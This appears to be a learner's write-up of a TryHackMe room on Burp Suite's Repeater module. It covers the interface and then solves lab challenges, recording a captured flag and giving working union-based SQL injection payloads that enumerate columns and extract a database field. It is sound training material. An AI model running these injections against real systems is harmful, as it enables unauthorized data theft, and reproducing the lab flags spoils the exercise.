# Welcome to the Burp Suite Repeater Room

In this room, we will explore the advanced capabilities of the Burp Suite framework by focusing on the Burp Suite Repeater module. Building upon the foundational knowledge covered in the [Burp Basics room](https://tryhackme.com/room/burpsuitebasics), we will delve into the powerful features of the Repeater tool. You will learn how to manipulate and resend captured requests, and we will explore the various options and functionalities available in this exceptional module. Throughout the room, we will provide practical examples, including a real-world exercise, to solidify your understanding of the concepts discussed.

If you are new to Burp Suite or have not completed the Burp Basics room, we recommend doing so before proceeding. The Burp Basics room establishes the fundamental knowledge necessary for this room and will enhance your learning experience.

Deploy the target VM attached to this task by pressing the green **Start Machine** button. Also, start the AttackBox by pressing the blue **Start AttackBox** button at the top of this room if you are not using your own machine. Then, start Burp and follow along with the next tasks.
# What is Repeater?

Before using Burp Suite Repeater, let's familiarize ourselves with its purpose and functionality. 

In essence, Burp Suite Repeater allows us to modify and resend intercepted requests to a target of our choosing. It allows us to take requests captured in the Burp Suite Proxy and *manipulate* them, sending them repeatedly as needed. Alternatively, we can manually create requests from scratch, similar to using a command-line tool like `cURL`.

The ability to edit and resend requests multiple times makes Repeater invaluable for manual exploitation and testing of endpoints. It provides a user-friendly interface for crafting payloads and offers various views of the response, including a rendering engine for graphical representation.

The Repeater interface consists of six main sections, as depicted in the annotated diagram below:

![](https://i.imgur.com/bIwpmSu.png)

1. **Request List**: Located at the top left of the tab, it displays the list of Repeater requests. Multiple requests can be managed simultaneously, and each new request sent to Repeater will appear here. 

2. **Request Controls**: Positioned directly beneath the request list, these controls allow us to send a request, cancel a hanging request, and navigate through the request history. 

3. **Request and Response View**: Occupying the majority of the interface, this section displays the **request** and **response** views. We can edit the request in the Request view and then forward it, while the corresponding response will be shown in the Response view.

4. **Layout Options**: Located at the top-right of the Request/Response view, these options enable us to customize the layout of the Request and Response views. The default setting is a side-by-side (horizontal layout), but we can also choose a vertical layout or combine them in separate tabs. 

5. **Inspector**: Positioned on the right-hand side, the Inspector allows us to analyze and modify requests in a more intuitive manner than using the raw editor. We will explore this feature in a later task.

6. **Target**: Situated above the Inspector, the Target field specifies the IP address or domain to which the requests are sent. When requests are sent to Repeater from other Burp Suite components, this field is automatically populated. 
# Basic Usage

We know what the application's interface looks like at this point, but how can we effectively utilize it?

While manual request crafting is an option, it is more common to capture a request using the Proxy module and subsequently transmit it to Repeater for further editing and resending.

Once a request has been captured in the Proxy module, we can send it to Repeater by either right-clicking on the request and selecting **Send to Receiver**, or by utilizing the keyboard shortcut `CTRL + R`.

Shifting our focus back to repeater, we can observe that our captured request is now accessible in the Request view:

![](https://i.imgur.com/DfZjrk0.png)

Both the Target and Inspector sections now display relevant information, albeit we are currently lacking a response. Upon clicking the **Send** button, the Response view swiftly populates:

![](https://i.imgur.com/nRdG6xM.png)

Should we wish to modify any aspect of the request, we can simply type within the Request view and press **Send** once again. This action will update the Response view on the right accordingly. For instance, altering the **Connection** header to "open" instead of "close" yields a response with a **Connection** header containing the value "keep-alive".

![](https://i.imgur.com/VWEKddw.png)

Furthermore, we can utilize the history buttons situated to the right of the Send button to navigate through our modification history, allowing us to move forward and backwards as needed.
# Message Analysis Toolbar

Repeater provides us with various request and response presentation options, ranging from hexadecimal output to a fully rendered page. 

To explore these options, we can refer to the section located above the response box, where the following four buttons are available:

![](https://i.imgur.com/L0BkX3S.png)

We are presented with the following display choices:

1. **Pretty**: This is the default option, which takes the raw response and applies slight formatting enhancements to improve readability.
2. **Raw**: This option displays the unmodified response directly received from the server without any additional formatting.
3. **Hex**: By selecting this view, we can examine the response in a byte-level representation, which is particularly useful when dealing with binary files.
4. **Render**: The render option allows us to visualize the page as it would appear in a web browser. While not commonly utilized in Repeater, as our focus is usually on the source code, it still offers a valuable feature. For most scenarios, **pretty** is generally sufficient. However, it is beneficial to be acquainted with the usage of the other three options. 

Adjacent to the view buttons, on the right-hand side, we find the **show non-printable** characters button (`\n`). This functionality enables the display of *characters that may not be visible* with the pretty and raw options.
	For example, each line in the response typically ends with the characters `\r\n`, representing a carriage return followed by a new line. These characters play an important role in the interpretation of HTTP headers.

While not mandatory for most tasks, this option can prove advantageous in certain situations.
# Inspector

Inspector is a supplementary feature to the Request and Response views in the Repeater module. It is also used to obtain a *visually organized* breakdown of requests and responses, as well as for experimenting to see how changes made using the higher-level Inspector affect the equivalent raw versions. 

Inspector can be utilized both in the Proxy and Repeater module. In both instances, it is situated on the far-right side of the window, presenting a list of components within the request and response:

![](https://i.imgur.com/gKBrg1E.png)

Among these components, the sections pertaining to the request can typically be modified, enabling the addition, editing, and removal of items. For instance, in the **Request Attributes** section, we can alter elements related to the location, method, and protocol of the request. This includes modifying the desired resource to retrieve, changing the HTTP method, from GET to another variant, or switching the protocol from HTTP/1 to HTTP/2:

![](https://i.imgur.com/DTOG3fJ.png)

Other sections available for viewing and/or editing include:

1. **Request Query Parameters**: These refer to data sent over the server via the URL. For example, in a GET request like `https://admin.tryhackme.com/?redirect=false`, the query parameter **redirect** has a value of "false".
2. **Request Body Parameters**: Similar to query parameters, but specific to POST requests. Any data sent as part of a POST request will be displayed in this section, allowing us to modify the parameters before resending. 
3. **Request Cookies**: This section contains a modifiable list of cookies sent with each request.
4. **Request Headers**: It enables us to view, access and modify (including adding or removing) any headers sent with our requests. Editing these headers can be valuable when examining how a web server responds to unexpected headers.
5. **Response Headers**: This section displays the headers returned by the server in response to our request. It cannot be modified, as we have no control over the headers returned by the server. Note that this section becomes visible only after sending a request and receiving a response.

While the textual representation of these components can be found within the Request and Response views, Inspector's tabular format provides a convenient way to visualize and interact with them. Experimenting with header actions, removals, and edits in Inspector helps grasp how the corresponding raw version changes in response.
# Practical Example

Repeater is particularly well-suited for tasks requiring repetitive sending of similar requests, typically with minor modifications. This is particularly useful for activities such as manual testing for SQL injection vulnerabilities, attempting to bypass web application firewall filters, or adjusting parameters in a form submission.

Let's begin with an exceedingly simple example: Utilizing Repeater to modify the headers of a request sent to a target.

Capture a request to `http://MACHINE_IP/` in the Proxy module and send it to Repeater.

Send the request once from Repeater — you should see the HTML source code for the page you requested in the Response view.

Try viewing this in one of the other display options (e.g. Hex).  

Using Inspector (or manually, if you prefer), add a header called `FlagAuthorised` and set it to have a value of `True`, as shown below:

```http
GET / HTTP/1.1
Host: 10.10.170.220
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
FlagAuthorised: True
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```
# Challenge

In the previous task, we demonstrated the usage of Repeater by adding a header and sending a request. This served as an illustrative example for utilizing Repeater. Now, it's time for a straightforward challenge. 

To begin, make sure Intercept is disabled in your Proxy module and navigate to `http://10.10.170.220/products`. Next, try clicking on some of the **See More** links.

Observe that you are redirected to a numeric endpoint (e.g. `/products/3`).

The objective is to validate the endpoint, confirming the existence of the number you wish to navigate to and ensuring it is a valid integer. However, consider what might occur if this endpoint is not adequately validated.
## Answer

Changing the parameter in the `/products/1` parameter to a negative integer caused a 500 Internal Server Error.

```http
GET /products/-1 HTTP/1.1
Host: 10.10.170.220
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.170.220/products/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Turning off the Proxy, then loading the page with the URL `/products/-1`, it responds with a 500 Internal Server Error and this flag:

```
THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}
```
# Extra-Mile Challenge

#### Extra-mile Challenge

This task is designed to test your skills in a slightly more challenging, real-world scenario utilizing Burp Repeater. If you possess the expertise to independently perform a manual SQL Injection, you can skip ahead to the final question and attempt this as a blind challenge. However, a detailed walkthrough will be provided below if you require guidance.
#### Prerequisite Knowledge

Before starting on this challenge, it is recommended that you familiarize yourself with the principles of SQL Injection. If you haven't already, please consider exploring the [SQL Injection](https://tryhackme.com/jr/sqlinjectionlm) room dedicated to this topic. Although a comprehensive step-by-step guide will be provided, having a basic understanding of SQL Injection principles will prove beneficial in completing this task.
#### Challenge Objective

Your objective in this challenge is to identify and exploit a Union SQL Injection vulnerability present in the ID parameter of the `/about/ID` endpoint. By leveraging this vulnerability, your task is to launch an attack to retrieve the notes about the CEO stored in the database.
#### Walkthrough

We know that there is a vulnerability, and we know where it is. Now we just need to exploit it!

Let's start by capturing a request to `http://MACHINE_IP/about/2` in the Burp Proxy. Once you have captured the request, send it to Repeater with `Ctrl + R` or by right-clicking and choosing "Send to Repeater".

Now that we have our request primed, let's confirm that a vulnerability exists. Adding a single apostrophe (`'`) is usually enough to cause the server to error when a simple SQLi is present, so, either using Inspector or by editing the request path manually, add an apostrophe after the "2" at the end of the path and send the request:

```http
GET /about/2' HTTP/1.1
Host: 10.10.230.141
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

We should see that the server responds with a "500 Internal Server Error", indicating that we successfully broke the query:

```http
HTTP/1.1 500 INTERNAL SERVER ERROR
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 31 Jan 2025 04:18:37 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 3101
Connection: keep-alive
```

If we look through the body of the server's response, we see something very interesting at around like 40. The server is telling us the query we tried to execute:

```html
<h2>
	<code>Invalid statement: 
		<code>SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'
		</code>
	</code>
</h2>
```

This is an extremely useful message that the server should *absolutely not be sending us*, but the fact that we have it makes our job significantly more straightforward.

The message tells us a couple of things that will be invaluable when exploiting this vulnerability:

- The database table we are selecting from is called `people`.
- The query selects five columns from the table: `firstName`, `lastName`, `pfplink`, `role` and `bio`.  We can guess where these fit into the page, which will be helpful for when we choose where to place our requests.

With this information, we can skip over the query column number and table name enumeration steps. Although we have managed to cut out a lot of the enumeration required here, we still need to find the name of our target column.

As we know the table name and the number of rows, we can use a **union query** to select the column names for the `people` table from the `columns` table in the `information_schema` default database.

A simple query for this is as follows:  

```sql
/about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
```

This creates a union query and selects our targets, then four null columns (to avoid the query erroring out). Notice that we also changed the ID that we are selecting from `2` to `0`. By setting the ID to an invalid number, we ensure that we don't retrieve anything with the original (legitimate) query; this means that the first row returned from the database will be our desired response from the injected query. 

Looking through the returned response, we can see that the first column name `(id)` has been inserted into the page title:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 31 Jan 2025 05:12:58 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Front-End-Https: on
Content-Length: 3360

<!DOCTYPE html>
<html lang=en>
    <head>
        <title>
          About | id None
	    </title>
```

We have successfully pulled the first column name out of the database, but now we have a problem. The page is only displaying the first matching item, we need to see all of the matching items. 

Fortunately, we can use our SQLi to group the results. We can still only retrieve one result at a time, but by using the `group_concat()` function, we can amalgamate all of the column names into a single output:

```sql
`/about/0 UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"`
```

this process is shown below:

![](https://i.imgur.com/qYfwwpX.png)

We have successfully identified eight columns in this table: `id`, `firstName`, `lastName`,`pfplink`, `role`, `shortRole`, `bio`, and `notes`.

Considering our task, it seems a safe bet that our target column is `notes`.

Finally, we are ready to take the flag from this database -- we have all of the information that we need:

- The name of the table: `people`.
- The name of the target column: `notes`.
- The ID of the CEO is `1`; this can be found simply by clicking on Jameson Wolfe's profile on the `/about/` page and checking the ID in the URL.

Let's craft a query to extract this flag:

```sql
0 UNION ALL SELECT notes,null,null,null,null FROM people WHERE id = 1
```

Hey presto, we have a flag!

![](https://i.imgur.com/aWM89UA.png)
# Conclusion

Congratulations on completing the Burp Suite Repeater room!

By now, you should have a solid understanding of effectively utilising Repeater to edit, manipulate, and resend requests. Additionally, you should have gained insight into the numerous practical applications of this tool.

In the next room of the module, we will explore the Burp Suite Intruder module. Intruder allows for automated and customizable attacks, making it a powerful tool for various security testing scenarios.

Good luck with the next room, and enjoy exploring the capabilities of [Burp Suite Intruder](https://tryhackme.com/room/burpsuiteintruder)!


